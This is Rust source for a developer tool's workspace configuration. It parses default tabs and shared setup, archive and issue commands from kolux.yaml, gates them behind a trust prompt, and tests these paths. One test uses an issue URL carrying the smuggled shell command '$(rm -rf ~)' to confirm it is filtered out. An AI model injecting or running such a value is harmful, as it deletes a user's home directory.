            _ => cur.push(c),
        }
    }
    parts.push(cur);
    parts
}

fn valid_color(c: &str) -> bool {
    c.strip_prefix('#').is_some_and(|h| (h.len() == 3 || h.len() == 6) && h.chars().all(|c| c.is_ascii_hexdigit()))
}

fn put_tab_field(tab: &mut SharedTab, key: &str, value: Option<String>) {
    let value = value.map(|v| v.trim().to_string()).filter(|v| !v.is_empty());
    match key {
        "title" => tab.title = value.filter(|v| v.chars().count() <= TAB_TITLE_MAX),
        "color" => tab.color = value.filter(|v| valid_color(v)),
        "command" => tab.command = value.filter(|v| v.chars().count() <= TAB_COMMAND_MAX),
        _ => {}
    }
}

/// PROJ-034: kolux.yaml's `defaultTabs` (COMPAT 5.6), read by a small line scanner like the other
/// keys. Err is why the file was refused outright (too big, or aliases out of control); then none of
/// it applies. Values are trimmed, a colour is `#rgb` or `#rrggbb` or ignored, an entry with no title,
/// colour or command is dropped, an over-long field is dropped, and only the first TABS_MAX stay.
pub fn default_tabs(yaml: &str) -> Result<Vec<SharedTab>, String> {
    if yaml.len() as u64 > SHARED_MAX {
        return Err(format!("{} is larger than {} KB, so its shared settings are ignored", crate::include::CONFIG_FILE, SHARED_MAX / 1024));
    }
    let aliases = yaml.split(|c: char| c.is_whitespace() || ",[]{}".contains(c)).filter(|t| is_alias(t)).count();
    if aliases > ALIASES_MAX {
        return Err(format!("{} uses too many aliases, so its shared settings are ignored", crate::include::CONFIG_FILE));
    }
    let lines: Vec<&str> = yaml.trim_start_matches('\u{feff}').lines().map(|l| l.trim_end_matches('\r')).collect();
    let indent = |l: &str| l.len() - l.trim_start().len();
    let Some(at) = lines.iter().position(|l| indent(l) == 0 && l.starts_with("defaultTabs:")) else { return Ok(Vec::new()) };
    let mut tabs: Vec<SharedTab> = Vec::new();
    let mut cur: Option<SharedTab> = None;
    let mut dash = 0;
    let mut j = at + 1;
    let finish = |cur: &mut Option<SharedTab>, tabs: &mut Vec<SharedTab>| {
        if let Some(t) = cur.take().filter(|t| t.title.is_some() || t.color.is_some() || t.command.is_some()) {
            if tabs.len() < TABS_MAX {
                tabs.push(t);
            }
        }
    };
    while j < lines.len() {
        let (line, t) = (lines[j], lines[j].trim());
        j += 1;
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let ind = indent(line);
        if ind == 0 && !t.starts_with('-') {
            break;
        }
        let pair = if let Some(rest) = t.strip_prefix('-') {
            finish(&mut cur, &mut tabs);
            cur = Some(SharedTab::default());
            dash = ind;
            let rest = rest.trim();
            if let Some(inner) = rest.strip_prefix('{').and_then(|r| r.trim_end().strip_suffix('}')) {
                let tab = cur.as_mut().unwrap();
                for part in flow_parts(inner) {
                    if let Some((k, v)) = tab_pair(part.trim()) {
                        put_tab_field(tab, k, tab_scalar(v));
                    }
                }
                continue;
            }
            tab_pair(rest)
        } else {
            tab_pair(t)
        };
        let (Some((key, value)), Some(tab)) = (pair, cur.as_mut()) else { continue };
        let own = if t.starts_with('-') { dash } else { ind.max(dash) };
        let v = value.trim();
        let scalar = if v.starts_with('|') || v.starts_with('>') {
            let body: Vec<&str> = lines[j..].iter().take_while(|l| l.trim().is_empty() || indent(l) > own).copied().collect();
            j += body.len();
            let cut = body.iter().filter(|l| !l.trim().is_empty()).map(|l| indent(l)).min().unwrap_or(0);
            let kept: Vec<&str> = body.iter().map(|l| l.get(cut..).unwrap_or("")).collect();
            Some(if v.starts_with('>') { kept.iter().map(|l| l.trim()).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ") } else { kept.join("\n").trim_end().to_string() })
        } else {
            tab_scalar(v)
        };
        put_tab_field(tab, key, scalar);
    }
    finish(&mut cur, &mut tabs);
    Ok(tabs)
}

/// PROJ-034: the one text the "tabs" trust approves: every default tab command, a line each; None
/// when no tab has a command (nothing would run, so nothing is asked).
pub fn tabs_trust_text(tabs: &[SharedTab]) -> Option<String> {
    let cmds: Vec<&str> = tabs.iter().filter_map(|t| t.command.as_deref()).collect();
    (!cmds.is_empty()).then(|| cmds.join("\n"))
}

/// PROJ-034: the default tabs for a workspace at `wt` of the repository at `root`: the worktree's own
/// kolux.yaml, else the main folder's. A missing file has none; Err is why a file was refused.
fn shared_tabs(root: &Path, wt: &Path) -> Result<Vec<SharedTab>, String> {
    for d in [wt, root] {
        match read_capped(&d.join(crate::include::CONFIG_FILE), SHARED_MAX) {
            Ok(text) => return default_tabs(&text),
            Err(e) if e.kind() == std::io::ErrorKind::InvalidData => return Err(format!("{} is larger than {} KB, so its shared settings are ignored", crate::include::CONFIG_FILE, SHARED_MAX / 1024)),
            Err(_) => {}
        }
    }
    Ok(Vec::new())
}

/// PROJ-034: what a new workspace opens as tabs, and whether the repository's trust must be asked first.
#[derive(serde::Serialize, Debug, PartialEq, Clone)]
pub struct DefaultTabs {
    /// The tabs to open; while `ask` is set their commands are left out.
    pub tabs: Vec<SharedTab>,
    pub ask: Option<TrustAsk>,
    /// Why the file's shared settings were ignored, when it was refused.
    pub refused: Option<String>,
}

/// PROJ-034: the default tabs for the new workspace at `path` of the repository at `root`; with
/// commands only once the "tabs" trust is given (SAFE-025), else `ask` carries the prompt.
#[tauri::command(async)]
pub fn workspace_default_tabs(store: StoreState<'_>, root: String, path: String) -> Result<DefaultTabs, String> {
    default_tabs_run(&root, &path, &|root, text| {
        let store = store.lock().map_err(|_| "Kolux could not check this repository's trust, so its kolux.yaml tab commands do not run".to_string())?;
        trust_ask(&store, root, "tabs", text)
    })
}

/// default_tabs' trust question: the repository's main folder and the commands' text.
type TabsAsk<'a> = &'a dyn Fn(&Path, &str) -> Result<Option<TrustAsk>, String>;

fn default_tabs_run(root: &str, path: &str, ask: TabsAsk<'_>) -> Result<DefaultTabs, String> {
    let tabs = match shared_tabs(Path::new(root), Path::new(path)) {
        Ok(tabs) => tabs,
        Err(why) => return Ok(DefaultTabs { tabs: Vec::new(), ask: None, refused: Some(why) }),
    };
    let Some(text) = tabs_trust_text(&tabs) else { return Ok(DefaultTabs { tabs, ask: None, refused: None }) };
    Ok(match ask(Path::new(root), &text)? {
        None => DefaultTabs { tabs, ask: None, refused: None },
        Some(a) => DefaultTabs { tabs: tabs.into_iter().map(|t| SharedTab { command: None, ..t }).collect(), ask: Some(a), refused: None },
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A trust gate that lets everything run, for tests about something else.
    fn open(_: &Path, _: &str, _: &str) -> Result<(), String> {
        Ok(())
    }

    #[test]
    fn proj033_the_setup_script_is_read_from_kolux_yaml() {
        assert_eq!(setup_script("scripts:\n  setup: pnpm i\nworktree:\n  x: 1\n").as_deref(), Some("pnpm i"));
        assert_eq!(setup_script("scripts:\r\n  setup: \"pnpm i # not a comment\"\r\n").as_deref(), Some("pnpm i # not a comment"));
        assert_eq!(setup_script("scripts:\n  setup: pnpm i # a comment\n").as_deref(), Some("pnpm i"));
        assert_eq!(setup_script("scripts:\n  other: 1\n  setup: |\n    #!/bin/bash -e\n    pnpm i\n\n    echo ok\nnext: 2\n").as_deref(), Some("#!/bin/bash -e\npnpm i\n\necho ok"));
        assert_eq!(setup_script("scripts:\n  setup: >\n    pnpm i\n    --frozen-lockfile\n").as_deref(), Some("pnpm i --frozen-lockfile"));
        assert_eq!(setup_script("worktree:\n  setup: no\nscripts:\n  run: x\n"), None, "only scripts.setup counts");
        assert_eq!(setup_script("scripts:\n  setup: ''\n"), None);
        assert_eq!(setup_script("scripts: {}\n"), None);
    }

    #[test]
    fn proj033_a_posix_first_line_runs_through_that_shell_with_its_flags() {
        let bash = |n: &str| (n == "bash").then(|| PathBuf::from("C:/Git/bin/bash.exe"));
        let l = setup_line("#!/bin/bash -e\r\npnpm i\r\n", true, Some(Path::new("powershell.exe")), bash).unwrap();
        assert_eq!(l.program, "C:/Git/bin/bash.exe");
        assert_eq!(l.args, ["-e", "-c", "#!/bin/bash -e\npnpm i\n"], "Windows line endings are accepted");
        let l = setup_line("#!/usr/bin/env bash\nmake", true, None, bash).unwrap();
        assert_eq!(l.program, "C:/Git/bin/bash.exe");
        assert_eq!(l.args[0], "-c");
        assert!(setup_line("#!/bin/zsh\nx", true, None, bash).unwrap_err().contains("zsh, which was not found"));
        assert_eq!(setup_line("#!/bin/sh\nx", false, None, bash).unwrap().program, "/bin/sh");
    }

    #[test]
    fn proj033_other_interpreters_are_not_posix_and_cmd_refuses_what_it_would_misread() {
        let none = |_: &str| None;
        // a python first line is not a POSIX shell: it goes the configured shell's way, here cmd
        assert!(setup_line("#!/usr/bin/env python\nprint(1)", true, Some(Path::new("powershell.exe")), none).unwrap_err().contains("more than one line"));
        let l = setup_line("pnpm i && pnpm build\r\n", true, Some(Path::new("C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe")), none).unwrap();
        assert_eq!(l.program, "cmd.exe");
        assert_eq!(l.args, ["/d", "/s", "/c", "pnpm i && pnpm build"]);
        assert!(setup_line("echo %PATH%", true, None, none).unwrap_err().contains("% signs"));
        assert!(setup_line("echo a^b", true, None, none).unwrap_err().contains("^"));
        assert!(setup_line("echo \"hi\"", true, None, none).unwrap_err().contains("quotes"));
        // a configured POSIX shell takes the script as it is, quotes and all
        let l = setup_line("echo \"%x\"\necho y", true, Some(Path::new("C:/Git/bin/bash.exe")), none).unwrap();
        assert_eq!(l.args, ["-c", "echo \"%x\"\necho y"]);
        assert_eq!(setup_line("echo hi", false, Some(Path::new("/usr/bin/fish")), none).unwrap().program, "sh");
    }

    fn tree(files: &[(&str, &[u8])]) -> PathBuf {
        static N: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
        let n = N.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("kolux-view112-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for (p, body) in files {
            let f = dir.join(p);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(f, body).unwrap();
        }
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn view112_other_tools_setup_and_teardown_commands_are_offered() {
        let dir = tree(&[
            ("conductor.json", b"{\"scripts\":{\"setup\":\"pnpm i\",\"run\":\"pnpm dev\",\"archive\":\"./archive.sh\"}}"),
            (".codex/environments/environment.toml", b"version = 1\r\nname = \"x\"\r\n\r\n[setup]\r\nscript = '''\r\npnpm install\r\npnpm build\r\n'''\r\n\r\n[setup.windows]\r\nscript = 'Copy-Item a b'\r\n\r\n[cleanup]\r\nscript = \"rm -rf .cache\"\r\n"),
        ]);
        let got = setup_imports(&dir);
        assert_eq!(got.len(), 2);
        assert_eq!(got[0], SetupImport { file: "conductor.json".into(), setup: Some("pnpm i".into()), teardown: Some("./archive.sh".into()), refused: None });
        assert_eq!(got[1].setup.as_deref(), Some("#!/bin/sh\npnpm install\npnpm build"), "a several-line script runs through sh");
        assert_eq!(got[1].teardown.as_deref(), Some("rm -rf .cache"));
        // what kolux.yaml already has is not offered again; a file with nothing left is not listed
        std::fs::write(dir.join("kolux.yaml"), "scripts:\n  setup: make\n").unwrap();
        let got = setup_imports(&dir);
        assert_eq!(got.iter().map(|o| (o.setup.is_some(), o.teardown.is_some())).collect::<Vec<_>>(), [(false, true), (false, true)]);
        std::fs::write(dir.join("kolux.yaml"), "scripts:\n  setup: make\n  archive: x\n").unwrap();
        assert!(setup_imports(&dir).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
        let none = tree(&[("README.md", b"hi")]);
        assert!(setup_imports(&none).is_empty());
        let _ = std::fs::remove_dir_all(&none);
    }

    #[test]
    fn view112_a_malformed_or_oversized_config_is_refused_and_offers_nothing() {
        let big = format!("{{\"scripts\":{{\"setup\":\"{}\"}}}}", "x".repeat(70 * 1024));
        let dir = tree(&[("conductor.json", big.as_bytes()), (".codex/environments/environment.toml", b"[setup\nscript = 'x'\n")]);
        let got = setup_imports(&dir);
        assert_eq!(got.len(), 2);
        assert!(got.iter().all(|o| o.setup.is_none() && o.teardown.is_none()));
        assert!(got[0].refused.as_deref().unwrap().contains("larger than 64 KB"));
        assert!(got[1].refused.as_deref().unwrap().contains("not valid TOML"));
        assert!(setup_import(dir.to_string_lossy().into_owned(), "conductor.json".into()).is_err(), "a refused file cannot be imported");
        assert!(!dir.join("kolux.yaml").exists());
        let _ = std::fs::remove_dir_all(&dir);
        for bad in [&b"{\"scripts\": [1]}"[..], b"[1,2]", b"{\"scripts\":", b"\xff\xfe{}"] {
            let dir = tree(&[("conductor.json", bad)]);
            let got = setup_imports(&dir);
            assert_eq!(got.len(), 1, "{bad:?}");
            assert!(got[0].refused.is_some() && got[0].setup.is_none(), "{bad:?}");
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    #[test]
    fn view112_an_import_lands_in_kolux_yaml_where_setup_reads_it() {
        let y = import_into("", Some("#!/bin/sh\npnpm i\n\nmake"), Some("./a.sh")).unwrap();
        assert_eq!(y, "scripts:\n  setup: |\n    #!/bin/sh\n    pnpm i\n\n    make\n  archive: |\n    ./a.sh\n");
        assert_eq!(setup_script(&y).as_deref(), Some("#!/bin/sh\npnpm i\n\nmake"));
        assert_eq!(scripts_entry(&y, "archive").as_deref(), Some("./a.sh"));
        let y = import_into("worktree:\r\n  sharedDirectories:\r\n    - node_modules\r\nscripts:\r\n    issueCommand: x\r\n", Some("pnpm i"), None).unwrap();
        assert_eq!(y, "worktree:\r\n  sharedDirectories:\r\n    - node_modules\r\nscripts:\r\n    setup: |\r\n      pnpm i\r\n    issueCommand: x\r\n");
        assert_eq!(setup_script(&y).as_deref(), Some("pnpm i"));
        let y = import_into("defaultTabs: []\n", None, Some("rm -rf x")).unwrap();
        assert_eq!(scripts_entry(&y, "archive").as_deref(), Some("rm -rf x"));
        assert!(y.starts_with("defaultTabs: []\nscripts:\n"));
        assert!(import_into("scripts: {}\n", Some("x"), None).unwrap_err().contains("by hand"));
        // the command writes the file in the project's folder
        let dir = tree(&[("conductor.json", b"{\"scripts\":{\"setup\":\"pnpm i\"}}")]);
        setup_import(dir.to_string_lossy().into_owned(), "conductor.json".into()).unwrap();
        assert_eq!(setup_script(&std::fs::read_to_string(dir.join("kolux.yaml")).unwrap()).as_deref(), Some("pnpm i"));
        assert!(setup_imports(&dir).is_empty(), "nothing is offered twice");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn proj036_the_issue_command_is_kolux_yamls_top_level_entry() {
        assert_eq!(top_entry("scripts:\n  setup: x\nissueCommand: 'claude \"fix #{{issue}}\"'\nnext: claude # a comment\n", ISSUE_KEY).as_deref(), Some("claude \"fix #{{issue}}\""));
        assert_eq!(top_entry("issueCommand: |\r\n  #!/bin/sh\r\n  gh issue view {{issue}}\r\nnext: 1\r\n", ISSUE_KEY).as_deref(), Some("#!/bin/sh\ngh issue view {{issue}}"));
        assert_eq!(top_entry("scripts:\n  issueCommand: nested\n", ISSUE_KEY), None, "only the top level counts");
        assert_eq!(scripts_entry("issueCommand: top\nscripts:\n  setup: s\n", "issueCommand"), None);
        assert_eq!(setup_script("issueCommand: x\nscripts:\n  setup: s\n").as_deref(), Some("s"), "setup still reads under scripts");
        assert_eq!(top_entry("issueCommand: ''\n", ISSUE_KEY), None);
        assert_eq!(top_entry("issueCommand: gh issue develop # a comment\n", ISSUE_KEY).as_deref(), Some("gh issue develop"));
    }

    #[test]
    fn proj036_the_issue_is_filled_in_and_its_title_never_reaches_the_shell() {
        let url = "https://github.com/o/r/issues/12";
        assert_eq!(fill_issue("work {{issue}} at {{issueUrl}}", 12, url), "work 12 at https://github.com/o/r/issues/12");
        assert_eq!(fill_issue("gh issue develop\n", 12, url), "gh issue develop 12", "no placeholder: the number goes last");
        assert_eq!(fill_issue("open {{issueUrl}}", 12, "https://x/$(rm -rf ~)"), "open ", "an address with shell characters is dropped");
        assert_eq!(fill_issue("open {{issueUrl}}", 12, "file:///c/x"), "open ");
    }

    #[test]
    fn proj036_a_create_from_issue_12_runs_the_command_and_the_local_one_wins() {
        let root = tree(&[("kolux.yaml", b"issueCommand: echo shared {{issue}}\n")]);
        crate::git::run(&["init", "-q"], Some(&root)).unwrap();
        let wt = tree(&[("kolux.yaml", b"issueCommand: echo worktree {{issue}}\n")]);
        let run = |r: &PathBuf, w: &PathBuf| issue_run(&r.to_string_lossy(), &w.to_string_lossy(), 12, "https://github.com/o/r/issues/12", &open).unwrap();
        let got = run(&root, &wt).expect("a shared issue command");
        assert!(got.shared);
        assert_eq!(got.line.script, "echo worktree 12", "the worktree's own kolux.yaml is read first");
        assert!(got.line.args.last().unwrap().contains("echo worktree 12"));
        let bare = tree(&[("README.md", b"x")]);
        assert_eq!(run(&root, &bare).unwrap().line.script, "echo shared 12", "else the main folder's");
        std::fs::create_dir_all(root.join(".kolux")).unwrap();
        std::fs::write(root.join(ISSUE_OVERRIDE), "\u{feff}echo local {{issue}}\r\n").unwrap();
        let got = run(&root, &wt).unwrap();
        assert!(!got.shared, "the local override wins over both shared ones");
        assert_eq!(got.line.script, "echo local 12");
        assert_eq!(got.command, "echo local {{issue}}");
        assert_eq!(run(&bare, &bare), None, "no issue command, nothing runs");
        for d in [root, wt, bare] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn stat055_local_settings_win_unless_the_policy_is_shared_first() {
        let shared = || Some("pnpm i".to_string());
        assert_eq!(pick_setup(Some("make\r\nmake test"), shared(), None), Some(("make\nmake test".into(), false)), "local wins by default");
        assert_eq!(pick_setup(Some("make"), shared(), Some("local")), Some(("make".into(), false)));
        assert_eq!(pick_setup(Some("make"), shared(), Some("shared-first")), Some(("pnpm i".into(), true)), "shared-first: kolux.yaml only");
        assert_eq!(pick_setup(Some("make"), None, Some("shared")), None, "shared-first never falls back to local");
        assert_eq!(pick_setup(Some("  "), shared(), None), Some(("pnpm i".into(), true)), "a blank local script is none");
        assert_eq!(pick_setup(None, None, None), None);
        // the setup command reads kolux.yaml inside the worktree being created
        let wt = tree(&[("kolux.yaml", b"scripts:\n  setup: echo shared\n")]);
        let p = wt.to_string_lossy().into_owned();
        assert_eq!(setup_for(&p, None, None, &open).unwrap().unwrap().script, "echo shared");
        assert_eq!(setup_for(&p, Some("echo local".into()), None, &open).unwrap().unwrap().script, "echo local");
        assert_eq!(setup_for(&p, Some("echo local".into()), Some("shared".into()), &open).unwrap().unwrap().script, "echo shared");
        let _ = std::fs::remove_dir_all(wt);
    }

    #[test]
    fn stat055_a_batch_file_runs_under_cmd_even_when_the_shell_is_git_bash() {
        let bash = Some(Path::new("C:/Program Files/Git/bin/bash.exe"));
        let none = |_: &str| None;
        let l = setup_line("scripts\\setup.bat --fast", true, bash, none).unwrap();
        assert_eq!((l.program.as_str(), l.args.last().unwrap().as_str()), ("cmd.exe", "scripts\\setup.bat --fast"));
        assert!(setup_line("\"tools\\Prep.CMD\"", true, bash, none).unwrap_err().contains("quotes"), "still refused what cmd would misread");
        assert_eq!(setup_line("./setup.sh", true, bash, none).unwrap().program, "C:/Program Files/Git/bin/bash.exe", "other scripts keep the POSIX shell");
        assert_eq!(setup_line("setup.bat", false, None, none).unwrap().program, "sh", "only on Windows");
    }

    #[test]
    fn stat055_scripts_get_the_root_worktree_and_name_and_never_a_half_active_conda() {
        let root = tree(&[("README.md", b"x")]);
        let wt = tree(&[(".git", b"gitdir: C:/repos/app/.git/worktrees/brave-otter\n")]);
        assert_eq!(main_folder(&wt), PathBuf::from("C:/repos/app"));
        assert_eq!(main_folder(&root), root, "a main folder is its own root");
        let vars = script_vars(Path::new("C:/repos/app"), Path::new("C:/ws/brave-otter"));
        assert_eq!(vars.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>(), ["KOLUX_ROOT_PATH=C:/repos/app", "KOLUX_WORKTREE_PATH=C:/ws/brave-otter", "KOLUX_WORKSPACE_NAME=brave-otter"]);
        let sh = with_env(SetupLine { program: "C:/Git/bin/bash.exe".into(), args: vec!["-e".into(), "-c".into(), "#!/bin/bash -e\nmake".into()], script: "#!/bin/bash -e\nmake".into() }, &[("KOLUX_ROOT_PATH", "C:/it's".into())], &CONDA_VARS);
        assert_eq!(sh.args, ["-e", "-c", "export KOLUX_ROOT_PATH='C:/it'\\''s'\nunset CONDA_PREFIX CONDA_DEFAULT_ENV CONDA_SHLVL CONDA_PROMPT_MODIFIER\n#!/bin/bash -e\nmake"]);
        assert_eq!(sh.script, "#!/bin/bash -e\nmake", "the script itself is unchanged");
        let cmd = with_env(SetupLine { program: "cmd.exe".into(), args: vec!["/d".into(), "/s".into(), "/c".into(), "pnpm i".into()], script: "pnpm i".into() }, &[("KOLUX_ROOT_PATH", "C:/Program Files (x86)/a".into()), ("KOLUX_WORKSPACE_NAME", "a&b".into())], &["CONDA_PREFIX"]);
        assert_eq!(cmd.args[3], "set KOLUX_ROOT_PATH=C:/Program Files (x86)/a&& set CONDA_PREFIX=&& pnpm i", "a value cmd would misread is left out");
        assert!(conda_partial(Some("C:\\conda\\envs\\x"), "C:\\Windows;C:\\conda\\condabin"), "named but not on the path");
        assert!(!conda_partial(Some("C:\\conda\\envs\\x"), "C:\\conda\\envs\\x\\Scripts;C:\\Windows"), "fully active");
        assert!(!conda_partial(None, "C:\\Windows"));
        let _ = std::fs::remove_dir_all(root);
        let _ = std::fs::remove_dir_all(wt);
    }

    #[test]
    fn stat055_removing_a_worktree_runs_its_archive_script_inside_it() {
        let wt = tree(&[("kolux.yaml", b"scripts:\n  archive: echo done>archived.txt\n")]);
        assert!(run_archive(Path::new("C:/repos/app"), &wt, std::time::Duration::from_secs(60), &|_| Ok(true)).unwrap());
        assert_eq!(std::fs::read_to_string(wt.join("archived.txt")).unwrap().trim(), "done");
        std::fs::write(wt.join("kolux.yaml"), "scripts:\n  setup: x\n").unwrap();
        assert!(!run_archive(&wt, &wt, std::time::Duration::from_secs(60), &|_| Ok(true)).unwrap(), "no archive script, nothing runs");
        let slow = if cfg!(windows) { "ping -n 6 127.0.0.1>nul" } else { "sleep 5" };
        std::fs::write(wt.join("kolux.yaml"), format!("scripts:\n  archive: {slow}\n")).unwrap();
        assert!(run_archive(&wt, &wt, std::time::Duration::from_millis(300), &|_| Ok(true)).unwrap_err().contains("stopped after"));
        // T-715: one this PC cannot start runs nothing, so it is neither asked about nor a reason to keep the workspace
        std::fs::write(wt.join("kolux.yaml"), "scripts:\n  archive: |\n    #!/usr/bin/t715-no-such-shell\n    echo x>never.txt\n").unwrap();
        let none = |_: &str| None::<PathBuf>;
        assert_eq!(shared_script_on("archive", &wt, &wt, None, None, true, None, none), None, "no trust question for it");
        assert!(shared_script_on("archive", &wt, &wt, None, None, false, None, none).is_some(), "where it can start, it is asked about");
        if cfg!(windows) {
            assert!(!run_archive(&wt, &wt, std::time::Duration::from_secs(60), &|_| panic!("asked about a script that cannot start")).unwrap());
            assert!(!wt.join("never.txt").exists());
        }
        // with a POSIX shell the variables reach the script
        if cfg!(not(windows)) || find_posix("sh").is_some() {
            std::fs::write(wt.join("kolux.yaml"), "scripts:\n  archive: |\n    #!/bin/sh\n    printf '%s|%s' \"$KOLUX_WORKSPACE_NAME\" \"$KOLUX_ROOT_PATH\" > vars.txt\n").unwrap();
            assert!(run_archive(Path::new("C:/repos/app"), &wt, std::time::Duration::from_secs(60), &|_| Ok(true)).unwrap());
            let name = wt.file_name().unwrap().to_string_lossy().into_owned();
            assert_eq!(std::fs::read_to_string(wt.join("vars.txt")).unwrap(), format!("{name}|C:/repos/app"));
        }
        let _ = std::fs::remove_dir_all(wt);
    }

    #[test]
    fn stat055_a_failed_archive_script_says_why_and_a_stopped_one_takes_everything_it_started() {
        let wt = tree(&[("kolux.yaml", b"scripts:\n  archive: echo boom 1>&2 && exit 3\n")]);
        let err = run_archive(&wt, &wt, std::time::Duration::from_secs(60), &|_| Ok(true)).unwrap_err();
        assert!(err.starts_with("The archive script failed with exit code 3"), "{err}");
        assert!(err.ends_with(": boom"), "what it wrote to its error output comes with the failure: {err}");
        if cfg!(windows) {
            // slow.bat starts a second cmd (a grandchild) that would write late.txt after ~5 s
            std::fs::write(wt.join("inner.bat"), "@ping -n 6 127.0.0.1 >nul\r\n@echo late>late.txt\r\n").unwrap();
            std::fs::write(wt.join("slow.bat"), "@cmd /d /c .\\inner.bat\r\n").unwrap();
            std::fs::write(wt.join("kolux.yaml"), "scripts:\n  archive: .\\slow.bat\n").unwrap();
            let err = run_archive(&wt, &wt, std::time::Duration::from_millis(1500), &|_| Ok(true)).unwrap_err();
            assert!(err.starts_with("The archive script was stopped after 1 seconds"), "{err}");
            std::thread::sleep(std::time::Duration::from_secs(7));
            assert!(!wt.join("late.txt").exists(), "the process the script started was ended with it");
        }
        let _ = std::fs::remove_dir_all(wt);
    }

    #[test]
    fn proj036_a_committed_issue_override_never_counts_as_the_users_own() {
        let git = |args: &[&str], dir: &Path| crate::git::run(args, Some(dir)).unwrap();
        let main = tree(&[("kolux.yaml", b"issueCommand: echo shared {{issue}}\n"), (".kolux/issue-command", b"echo committed {{issue}}\n")]);
        git(&["init", "-q"], &main);
        git(&["add", "-A"], &main);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "x"], &main);
        let wt = main.with_file_name(format!("{}-wt", main.file_name().unwrap().to_string_lossy()));
        git(&["worktree", "add", "-q", "-b", "issue-12", &wt.to_string_lossy()], &main);
        assert!(wt.join(ISSUE_OVERRIDE).exists(), "the branch carries the committed override");
        assert_eq!(issue_command(&main, &wt), Some(("echo shared {{issue}}".into(), true)), "a committed override is ignored in the main folder and the worktree");
        std::fs::remove_file(wt.join("kolux.yaml")).unwrap();
        std::fs::remove_file(main.join("kolux.yaml")).unwrap();
        assert_eq!(issue_command(&main, &wt), None, "with no shared command, a committed override still never runs");
        git(&["rm", "-q", "--cached", ISSUE_OVERRIDE], &main);
        assert_eq!(issue_command(&main, &wt), Some(("echo committed {{issue}}".into(), false)), "once git stops tracking it in the main folder, it is the user's own");
        assert_eq!(issue_command(&wt, &wt), None, "the worktree's copy is never read as the user's own");
        let _ = git(&["worktree", "remove", "--force", &wt.to_string_lossy()], &main);
        let bare = tree(&[(".kolux/issue-command", b"echo x\n")]);
        assert_eq!(issue_command(&bare, &bare), None, "outside a repository git cannot prove it untracked");
        // council FIX-1: a committed override in other capitals, which a case-blind disk opens
        // through the lower-case path, is still tracked text
        let caps = tree(&[(".KOLUX/Issue-Command", b"echo caps {{issue}}\n")]);
        git(&["init", "-q"], &caps);
        git(&["add", "-A"], &caps);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "x"], &caps);
        let case_blind = caps.join(ISSUE_OVERRIDE).exists();
        if case_blind {
            assert_eq!(issue_command(&caps, &caps), None, "a committed .KOLUX/Issue-Command is never the user's own");
        }
        git(&["rm", "-q", "--cached", ".KOLUX/Issue-Command"], &caps);
        if case_blind {
            assert_eq!(issue_command(&caps, &caps), Some(("echo caps {{issue}}".into(), false)), "untracked in any capitals, it is the user's own");
        }
        assert!(case_blind || !cfg!(windows), "NTFS opens the file through the lower-case path");
        for d in [main, wt, bare, caps] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn proj036_an_override_reached_through_a_link_never_counts_as_the_users_own() {
        let git = |args: &[&str], dir: &Path| crate::git::run(args, Some(dir)).unwrap();
        let main = tree(&[("docs/issue-command", b"echo linked {{issue}}\n"), ("real/issue-command", b"echo real\n")]);
        git(&["init", "-q"], &main);
        git(&["add", "docs"], &main);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "x"], &main);
        #[cfg(windows)]
        let (dir_link, file_link) = (std::os::windows::fs::symlink_dir(main.join("docs"), main.join(".kolux")), |a: &Path, b: &Path| std::os::windows::fs::symlink_file(a, b));
        #[cfg(not(windows))]
        let (dir_link, file_link) = (std::os::unix::fs::symlink(main.join("docs"), main.join(".kolux")), |a: &Path, b: &Path| std::os::unix::fs::symlink(a, b));
        if dir_link.is_err() {
            eprintln!("symlinks need Developer Mode here; the link case was not exercised");
        } else {
            assert!(main.join(ISSUE_OVERRIDE).exists(), "the link reads the tracked text");
            assert_eq!(issue_command(&main, &main), None, "a linked .kolux folder is refused");
            std::fs::remove_dir(main.join(".kolux")).or_else(|_| std::fs::remove_file(main.join(".kolux"))).unwrap();
            std::fs::create_dir(main.join(".kolux")).unwrap();
            file_link(&main.join("real/issue-command"), &main.join(ISSUE_OVERRIDE)).unwrap();
            assert_eq!(issue_command(&main, &main), None, "a linked issue-command file is refused");
            std::fs::remove_file(main.join(ISSUE_OVERRIDE)).unwrap();
            std::fs::write(main.join(ISSUE_OVERRIDE), "echo own\n").unwrap();
            assert_eq!(issue_command(&main, &main), Some(("echo own".into(), false)), "a plain untracked file still counts");
        }
        let _ = std::fs::remove_dir_all(main);
    }
    fn trust_store() -> (crate::state::Store, PathBuf, PathBuf) {
        let dir = tree(&[]);
        let root = tree(&[("kolux.yaml", b"scripts:\n  setup: echo shared\n  archive: echo bye\nissueCommand: work {{issue}}\n")]);
        let store = crate::state::Store::open(&dir).unwrap();
        crate::projects::register_project(&store, (root.clone(), root.clone())).unwrap();
        (store, dir, root)
    }

    #[test]
    fn safe025_a_shared_script_asks_once_and_a_changed_one_asks_again() {
        let (store, dir, root) = trust_store();
        let ask = trust_ask(&store, &root, "setup", "echo shared").unwrap().expect("the first time it asks");
        assert_eq!((ask.kind.as_str(), ask.script.as_str(), ask.changed), ("setup", "echo shared", false));
        assert_eq!(ask.project, root.file_name().unwrap().to_string_lossy());
        trust_grant(&store, &root, "setup", "echo shared", false).unwrap();
        assert_eq!(trust_ask(&store, &root, "setup", "echo shared").unwrap(), None, "the same text runs without asking");
        assert_eq!(trust_ask(&store, &root, "setup", "echo shared\r\necho two").unwrap().map(|a| a.changed), Some(true), "an edited script asks again, worded as changed");
